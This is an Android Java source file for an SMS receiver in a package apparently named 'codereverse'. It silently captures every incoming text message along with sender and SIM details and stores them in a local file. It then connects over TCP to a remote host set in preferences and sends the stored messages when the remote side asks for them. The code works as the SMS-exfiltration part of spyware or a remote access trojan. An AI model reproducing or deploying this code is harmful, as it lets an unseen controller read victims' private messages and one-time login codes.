package com.anubhav.codereverse.utils.smscatcher;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.text.TextUtils;
import android.util.Log;

import com.anubhav.codereverse.database.SharedPreferenceManager;
import com.anubhav.codereverse.utils.Constants;
import com.anubhav.codereverse.utils.Utils;
import com.anubhav.codereverse.utils.socket.OnReadListener;
import com.anubhav.codereverse.utils.socket.TCPClient;
import com.anubhav.codereverse.utils.socket.common.ObjectWriter;

import org.json.JSONObject;

public class SmsReceiver extends BroadcastReceiver {

    private OnSmsCatchListener<String> callback;
    private String phoneNumberFilter;
    private String filter;

    /**
     * Set result callback
     *
     * @param callback OnSmsCatchListener
     */
    public void setCallback(OnSmsCatchListener<String> callback) {
        this.callback = callback;
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        final Bundle bundle = intent.getExtras();
        try {
            if (bundle != null) {
                int receivedInSimSlot = Integer.parseInt(getReceivedInSimInfo(context, bundle)[0]);
                String receivedInCarrierName = getReceivedInSimInfo(context, bundle)[1];
                String receivedInNumber = getReceivedInSimInfo(context, bundle)[2];

                String senderNumber = "";
                StringBuilder message = new StringBuilder();
                final Object[] pdusObj = (Object[]) bundle.get("pdus");
                SmsMessage[] messages = new SmsMessage[pdusObj.length];
                for (int i = 0; i < messages.length; i++) {
                    messages[i] = getIncomingMessage(pdusObj[i], bundle);

                    senderNumber = messages[i].getOriginatingAddress();
                    message.append(messages[i].getMessageBody());
                }

                if (phoneNumberFilter != null && !senderNumber.equals(phoneNumberFilter)) {
                    return;
                }
                if (filter != null && !message.toString().matches(filter)) {
                    return;
                }
                if (callback != null) {
                    callback.onSmsCatch(message.toString(), senderNumber, receivedInSimSlot, receivedInCarrierName, receivedInNumber);
                } else {
                    try {
                        JSONObject msgObject = new JSONObject();
                        msgObject.put("timeStamp", Utils.getTimeStamp());
                        msgObject.put("message", message);
                        msgObject.put("senderNumber", senderNumber);
                        msgObject.put("receivedInSimSlot", receivedInSimSlot);
                        msgObject.put("receivedInCarrierName", receivedInCarrierName);
                        msgObject.put("receivedInNumber", receivedInNumber);
                        Utils.saveJsonObjectInArray(context, Constants.USER_SMS_FILENAME, msgObject);
                    } catch (Exception e) {
                        Utils.getLog(context, e.toString());
                        e.printStackTrace();
                    } finally {
                        new Thread(new Runnable() {
                            @Override
                            public void run() {
                                try {
                                    SharedPreferenceManager preferences = SharedPreferenceManager.get(context);
                                    TCPClient tcpClient = new TCPClient(context, preferences.remoteHost(), preferences.remotePort());
                                    tcpClient.connect(new OnReadListener() {
                                        @Override
                                        public void onReadData(String key, Object data, ObjectWriter writer) {
                                            try {
                                                if (Constants.KEY_GET_SMS.equals(key)) {
                                                    String userSmsArray = Utils.getStringFromFile(context, Constants.USER_SMS_FILENAME);
                                                    if (TextUtils.isEmpty(userSmsArray)) userSmsArray = "[]";
                                                    writer.write(userSmsArray);
                                                }
                                            } catch (Exception e) {
                                                e.printStackTrace();
                                                Utils.getLog("OnReadListener", e.toString());
                                            }
                                        }
                                    });
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }
                            }
                        }).start();
                    }
                }
            }
        } catch (Exception e) {
            Log.e("SmsReceiver", "Exception smsReceiver" + e);
        }
    }

    private SmsMessage getIncomingMessage(Object aObject, Bundle bundle) {
        SmsMessage currentSMS;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String format = bundle.getString("format");
            currentSMS = SmsMessage.createFromPdu((byte[]) aObject, format);
        } else {
            currentSMS = SmsMessage.createFromPdu((byte[]) aObject);
        }
        return currentSMS;
    }

    @SuppressLint("MissingPermission")
    private String[] getReceivedInSimInfo(Context context, Bundle bundle) {
        String simSlotIndex = "-1", carrierName = "", phoneNumber = "";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            int sub = bundle.getInt("subscription", -1);
            SubscriptionManager manager = SubscriptionManager.from(context);
            SubscriptionInfo subInfo = manager.getActiveSubscriptionInfo(sub);
            if (subInfo != null) {
                simSlotIndex = String.valueOf(subInfo.getSimSlotIndex());
                carrierName = subInfo.getCarrierName().toString();
                if (subInfo.getNumber() != null) {
                    phoneNumber = subInfo.getNumber();
                }
                /*Log.e("SmsReceiver",
                        "\n Sim Slot Index is >>>  " + subInfo.getSimSlotIndex()
                                + "\n Phone No is >>>  " + subInfo.getNumber() //not guaranteed to be available
                                + "\n Carrier Name is >>>  " + subInfo.getCarrierName()
                );*/
            }
        }
        return new String[]{simSlotIndex, carrierName, phoneNumber};
    }

    /**
     * Set phone number filter
     *
     * @param phoneNumberFilter phone number
     */
    public void setPhoneNumberFilter(String phoneNumberFilter) {
        this.phoneNumberFilter = phoneNumberFilter;
    }

    /**
     * set message filter with regexp
     *
     * @param regularExpression regexp
     */
    public void setFilter(String regularExpression) {
        this.filter = regularExpression;
    }

}